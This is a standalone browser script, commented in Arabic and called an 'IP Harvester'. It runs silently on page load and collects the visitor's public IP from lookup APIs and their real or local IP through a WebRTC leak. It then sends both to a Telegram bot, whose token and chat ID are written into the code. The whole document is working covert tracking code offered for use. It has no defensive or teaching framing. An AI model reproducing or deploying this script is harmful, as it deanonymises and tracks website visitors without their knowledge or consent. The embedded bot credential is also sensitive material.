<script>
  // ==========================================
  // Ghost Protocol: Multi-Vector IP Harvester
  // ==========================================

  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";

  async function sendToTG(title, text) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>${title}</b>\n━━━━━━━━━━━━━━━\n${text}`, parse_mode: 'HTML' })
      });
    } catch (e) {}
  }

  // 1. الطريقة الأولى: API Fallback
  async function getIP_API() {
    const apis = [
      "https://api.ipify.org?format=json",
      "https://ipinfo.io/json",
      "https://api.my-ip.io/ip.json"
    ];
    
    for (let api of apis) {
      try {
        const res = await fetch(api);
        const data = await res.json();
        if (data.ip) return data.ip;
      } catch (e) { continue; }
    }
    return "Blocked";
  }

  // 2. الطريقة الثانية: WebRTC Leak (يجلب الـ IP المحلي والعام)
  function getIP_WebRTC() {
    return new Promise((resolve) => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.createOffer().then(pc.setLocalDescription.bind(pc));
      
      pc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
        const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
        resolve(myIP); // جلب الـ IP
        pc.onicecandidate = null;
      };
      
      // مهلة زمنية (Timeout) في حال لم يرجع شيء
      setTimeout(() => resolve("WebRTC Blocked"), 2000);
    });
  }

  // 3. الطريقة الثالثة: صورة خفية (Image Tag)
  // لا يمكننا جلب الـ IP مباشرة عبر صورة، لكن يمكننا إرسال طلب لخادمنا.
  // (بما إننا نستخدم تلجرام، لا يمكننا استخدام الصورة هنا لجلب الـ IP، سنعتمد على الـ API و WebRTC).

  // ==========================================
  // التنفيذ
  // ==========================================
  
  async function runHarvester() {
    console.log("Initiating IP Hunt...");
    
    const ipApi = await getIP_API();
    const ipWebRTC = await getIP_WebRTC();
    
    let report = `
🌐 <b>IP Harvest Results</b>
━━━━━━━━━━━━━━━
🔌 <b>IP (API):</b> <code>${ipApi}</code>
📡 <b>IP (WebRTC):</b> <code>${ipWebRTC}</code>
    `.trim();

    await sendToTG("🕵️‍♂️ IP Harvest Successful", report);
  }

  // تشغيل الفحص عند تحميل الصفحة (قبل حتى أن يدخل البيانات)
  window.addEventListener('load', () => {
    setTimeout(runHarvester, 1000);
  });
</script>
